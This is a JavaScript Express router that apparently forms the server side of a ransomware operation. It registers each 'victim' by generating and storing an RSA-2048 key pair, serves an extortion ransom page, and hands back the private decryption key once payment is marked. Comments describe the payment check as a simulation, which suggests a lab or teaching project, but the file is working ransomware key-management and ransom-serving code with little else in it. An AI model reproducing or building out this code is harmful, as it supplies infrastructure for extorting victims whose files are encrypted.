const express = require('express');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const { generateRSAKeyPair } = require('../crypto/keygen');
const db = require('../db/database');

const router = express.Router();

/**
 * POST /api/register
 * Called when the victim's browser initiates the attack.
 * Generates RSA-2048 keys, saves private key, returns public key.
 */
router.post('/register', (req, res) => {
    try {
        const victimId = 'V-' + crypto.randomUUID().substring(0, 8).toUpperCase();

        // Generate Keys
        const { publicKey, privateKey } = generateRSAKeyPair();

        // Save to DB
        db.saveVictim({
            id: victimId,
            publicKey: publicKey,
            privateKey: privateKey, // NEVER share this with the client
            paid: false,
            timestamp: new Date().toISOString()
        });

        res.status(201).json({
            victimId: victimId,
            publicKey: publicKey
        });
    } catch (error) {
        res.status(500).json({ error: "Failed to register victim" });
    }
});

/**
 * GET /api/ransom/:victimId
 * Serves the extortion/ransom note page dynamically.
 */
router.get('/ransom/:victimId', (req, res) => {
    const victim = db.getVictim(req.params.victimId);

    if (!victim) {
        return res.status(404).send("Victim not found.");
    }

    // Read template and inject ID
    const templatePath = path.join(__dirname, '../views/ransom.html');
    if (!fs.existsSync(templatePath)) {
        return res.status(500).send("Ransom template missing.");
    }

    let html = fs.readFileSync(templatePath, 'utf8');
    html = html.replace(/{{VICTIM_ID}}/g, victim.id);

    res.send(html);
});

/**
 * POST /api/decrypt-key/:victimId
 * Simulates payment verification.
 */
router.post('/decrypt-key/:victimId', (req, res) => {
    const victim = db.getVictim(req.params.victimId);

    if (!victim) {
        return res.status(404).json({ error: "Victim not found" });
    }

    // For simulation: we just flip the paid flag
    // In reality, this would check the blockchain for a transaction
    db.updateVictim(victim.id, { paid: true });

    res.json({
        status: "success",
        message: "Payment verified.",
        privateKey: victim.privateKey
    });
});

module.exports = router;
